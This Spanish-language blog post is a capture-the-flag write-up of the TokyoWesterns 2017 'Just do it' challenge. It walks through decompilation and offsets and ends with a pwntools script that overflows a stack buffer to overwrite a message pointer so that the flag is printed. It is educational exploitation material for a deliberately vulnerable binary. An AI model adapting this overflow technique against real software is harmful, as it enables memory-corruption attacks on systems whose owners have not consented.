---
layout: post
title: Just do it - Nightmare
tags: [ctf, rev, nightmare]
---

**Just do it** \\
TokyoWesterns 2017 ctf


## Análisis

**pwn checksec**:
```
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

"PIE: No PIE (0x8048000)" indica que el ejecutable no es un ejecutable independiente de posición y se cargará en la dirección base fija "0x8048000". Esto es importante para el análisis de seguridad ya que se mantendrán las direcciones entre ejecuciones.

## Ghidra

```c
undefined4 main(void)

{
  char *input_ptr;
  int cmp_pass;
  char usrInput [16];
  FILE *file_ptr;
  char *result_message;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  result_message = failed_message;
  file_ptr = fopen("flag.txt","r");
  if (file_ptr == (FILE *)0x0) {
    perror("file open error.\n");
    exit(0);
  }
  input_ptr = fgets(flag,0x30,file_ptr);
  if (input_ptr == (char *)0x0) {
    perror("file read error.\n");
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  input_ptr = fgets(usrInput,0x20,stdin);
  if (input_ptr == (char *)0x0) {
    perror("input error.\n");
    exit(0);
  }
  cmp_pass = strcmp(usrInput,PASSWORD);
  if (cmp_pass == 0) {
    result_message = success_message;
  }
  puts(result_message);
  return 0;
}
```
El codigo realiza lo siguiente:
1. Abre un archivo llamado "flag.txt" en modo de lectura.
2. Lee una cadena de texto desde el archivo "flag.txt" y la almacena en la variable flag.
3. Pide al usuario que ingrese una contraseña a través de la entrada estándar.
4. Compara la contraseña ingresada por el usuario (usrInput) con una contraseña almacenada en la variable PASSWORD.
5. Dependiendo de si la contraseña ingresada coincide con la contraseña almacenada en PASSWORD, se establece el mensaje de resultado en success_message o failed_message.
6. Imprime el mensaje de resultado en la salida estándar.
7. El programa retorna 0 al finalizar, lo que indica que se ejecutó sin errores.

Son los puntos 3 y 6 los que nos permitiran resolver el desafío ya que mediante un bufferoverflow se puede sobreescribir el puntero "result_message" para que apunte a la cadena "flag" y lo imprima al final del programa.

## Exploit

Lo primero que necesito es saber la posición de memoria en la que se almacenará la bandera al leerla del archivo "flag.txt".
```
[0x080485bb]> is
[...]
74  0x000005bb 0x080485bb GLOBAL FUNC   337      main
76  ---------- 0x0804a040 GLOBAL OBJ    0        __TMC_END__
78  ---------- 0x0804a080 GLOBAL OBJ    48       flag
79  0x00001034 0x0804a034 GLOBAL OBJ    4        success_message
80  0x000003f8 0x080483f8 GLOBAL FUNC   0        _init
81  0x0000103c 0x0804a03c GLOBAL OBJ    4        PASSWORD
[...]
```

Se guardará en la dirección **0x0804a080**.

A continuación, utilizo **radare2** para calcular la distancia entre la entrada del usuario y "result_message".

```
┌ 337: int main (char **argv);
│           ; var int32_t usrInput @ ebp-0x20
│           ; var int32_t file_ptr @ ebp-0x10
│           ; var int32_t result_message @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg char **argv @ esp+0x54
│           0x080485bb      8d4c2404       lea ecx, [argv]
│           0x080485bf      83e4f0         and esp, 0xfffffff0
│           0x080485c2      ff71fc         push dword [ecx - 4]
│           0x080485c5      55             push ebp
│           0x080485c6      89e5           mov ebp, esp
│           0x080485c8      51             push ecx
│           0x080485c9      83ec24         sub esp, 0x24
│           0x080485cc      a160a00408     mov eax, dword [obj.stdin]
```

Calculo la diferencia

```
    0x20
  -  0xc
----------
    0x14
```

### Script

Conociendo la dirección de memoria a sobreescribir y el padding, hacer el script es muy sencillo.

```py
from pwn import *

# Iniciar el proceso
target = process('just_do_it')

# Crear payload
payload = b"A" * 0x14 # Padding
payload += p32(0x0804a080) # obj.flag dirección

# Enviar el payload
target.sendline(payload)

target.interactive()
```

```
h3rshel@kali:~/Desktop/reversing$ python3 exploit.py
Welcome my secret service. Do you know the password?
Input the password.
TWCTF{pwnable_warmup_I_did_it!}
```

Página original: **[Nightmare](https://guyinatuxedo.github.io/)**.

